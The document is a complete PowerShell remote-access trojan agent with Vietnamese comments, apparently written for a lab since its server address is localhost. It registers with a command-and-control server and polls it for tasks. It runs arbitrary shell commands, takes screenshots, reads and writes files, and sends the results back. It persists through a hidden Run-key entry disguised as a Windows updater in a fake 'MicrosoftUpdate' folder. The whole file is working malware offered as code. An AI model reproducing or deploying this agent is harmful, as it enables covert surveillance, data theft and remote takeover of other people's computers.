# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        return Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
    } catch { return $null }
}

function Send-Result ($output_str) {
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output_str)
        $encoded = [System.Convert]::ToBase64String($bytes)
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$encoded}
    } catch {}
}

function Capture-Screen {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64_img = [Convert]::ToBase64String($ms.ToArray())
        $graphics.Dispose(); $bmp.Dispose(); $ms.Dispose()
        return "[IMAGE] $base64_img"
    } catch { return "Error: $_" }
}

# Hàm cài đặt Persistence
function Install-Persistence {
    try {
        # 1. Xác định đường dẫn script hiện tại và nơi muốn ẩn mình
        $current_script = $MyInvocation.MyCommand.Path
        if (-not $current_script) { return "Error: Cannot determine script path (Running from IDE?)" }
        
        $hidden_dir = "$env:APPDATA\MicrosoftUpdate"
        $hidden_script = "$hidden_dir\updater.ps1"
        
        # 2. Tạo thư mục ẩn và copy script vào đó
        if (-not (Test-Path $hidden_dir)) { New-Item -ItemType Directory -Path $hidden_dir | Out-Null }
        Copy-Item -Path $current_script -Destination $hidden_script -Force
        
        # 3. Thêm vào Registry Run Key (Khởi động cùng Windows)
        $cmd_trigger = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hidden_script`""
        $reg_path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        
        New-ItemProperty -Path $reg_path -Name "WindowsSystemUpdater" -Value $cmd_trigger -PropertyType String -Force | Out-Null
        
        return "Persistence installed successfully! Path: $hidden_script"
    }
    catch {
        return "Persistence failed: $_"
    }
}

# --- MAIN LOOP ---

Write-Host "[*] Agent Started."
$agent_id = Register-Agent
if (-not $agent_id) { Write-Host "[-] Failed."; Exit }
Write-Host "[+] Assigned ID: $agent_id"

while ($true) {
    $encoded_task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($encoded_task)) {
        try {
            $bytes = [System.Convert]::FromBase64String($encoded_task)
            $cmd_full = [System.Text.Encoding]::UTF8.GetString($bytes)
            Write-Host "[*] Processing: $cmd_full"
            
            $parts = $cmd_full -split " "
            $type = $parts[0]

            if ($type -eq "screenshot") {
                $result = Capture-Screen
            }
            # [MỚI] Xử lý lệnh persistence
            elseif ($type -eq "persistence") {
                $result = Install-Persistence
            }
            elseif ($type -eq "upload") {
                if ($parts.Count -eq 3) {
                    $path = $parts[1]; $content = $parts[2]
                    try {
                        [System.IO.File]::WriteAllBytes($path, [System.Convert]::FromBase64String($content))
                        $result = "Uploaded: $path"
                    } catch { $result = "Error: $_" }
                }
            }
            elseif ($type -eq "download") {
                if ($parts.Count -ge 2) {
                    $path = $parts[1]
                    try {
                        $b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
                        $name = [System.IO.Path]::GetFileName($path)
                        $result = "[FILE] $name $b64"
                    } catch { $result = "Error: $_" }
                }
            }
            else {
                $result = cmd /c $cmd_full 2>&1 | Out-String
            }
        } catch { $result = "Error: $_" }
        Send-Result -output_str $result
    }
    Start-Sleep -Seconds $sleep_time
}